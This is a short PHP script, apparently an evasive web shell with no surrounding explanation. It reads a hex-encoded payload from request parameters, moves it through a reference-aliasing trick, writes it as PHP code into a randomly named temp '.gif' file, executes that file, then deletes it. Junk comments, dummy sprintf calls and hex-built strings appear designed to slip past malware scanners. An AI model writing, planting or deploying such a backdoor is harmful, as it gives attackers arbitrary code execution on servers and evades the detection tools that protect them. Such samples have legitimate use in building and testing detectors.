<?php
function filterStr($hex)
{
    $str = chr(hexdec('3f')) . chr(hexdec('70')) . 'h';
    $str .= "p" . "\n";
    for ($i = 0; $i < strlen($hex) - 1; $i += 2)
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    return $str . "?";
}
function randomGifFile()
{
    $string_table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $tmp = '';
    // ljAQkEmpmlTUnBgFkz9P
    for ($i = 0; $i < 6; $i++) {
        $tmp .= $string_table[rand(0, 62 - 1)];
    }
    return sys_get_temp_dir() . "/" . $tmp;
}
if (!isset($_GET["id"]) || !isset($_POST["ftp"])) {
    die;
}
// ljAQkEmpmlTUnBgFkz9P
$a = array(1 => "userName");
$b =& $a[1];
$c = $a;
// gpasda
$c[$_GET["id"]] = $_POST["ftp"];
$fileName = randomGifFile() . ".gif";
file_put_contents($fileName, "" . chr(hexdec('3c')) . filterStr($a[1]) . ">");
sprintf("hello world%s","1");sprintf("hello world%s","2");sprintf("hello world%s","3");
if (file_exists($fileName)) {
    require_once /*file hhh*/$fileName;
}
// ljAQkEmpmlTUnBgFkz9P
@unlink($fileName);
echo(md5("0cabcd!@#A."));die;  
?>